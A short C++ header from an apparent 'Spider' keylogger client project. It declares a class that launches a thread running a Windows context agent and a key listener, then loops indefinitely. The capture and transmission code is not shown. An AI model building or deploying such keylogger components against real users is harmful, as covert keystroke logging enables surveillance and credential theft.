//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_SPIDERKEYLOGGER_HPP
#define SPIDER_CLIENT_SPIDERKEYLOGGER_HPP

#include <thread>
#include "ISpiderKeyLogger.hpp"
#include "IWindowsContextAgent.hpp"
#include "WindowsContextAgent.hpp"
#include "IWindowsKeyListener.hpp"
#include "WindowsKeyListener.hpp"

class SpiderKeyLogger : public ISpiderKeyLogger {
private:
	std::unique_ptr<std::thread> _keyLoggerThread;
	std::unique_ptr<IWindowsContextAgent> ContextAgent = std::unique_ptr<IWindowsContextAgent>(new WindowsContextAgent());
	std::unique_ptr<IWindowsKeyListener> KeyListener = std::unique_ptr<IWindowsKeyListener>(new WindowsKeyListener());

	static void RunKeyLogger(IWindowsContextAgent *contextAgent, IWindowsKeyListener *keyListener) {
		contextAgent->Run();
		keyListener->Run();
		while (true) {
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
	}

public:
	void Run() {
		_keyLoggerThread = std::unique_ptr<std::thread>(new std::thread(RunKeyLogger, ContextAgent.get(), KeyListener.get()));
		
	}
};

#endif //SPIDER_CLIENT_SPIDERKEYLOGGER_HPP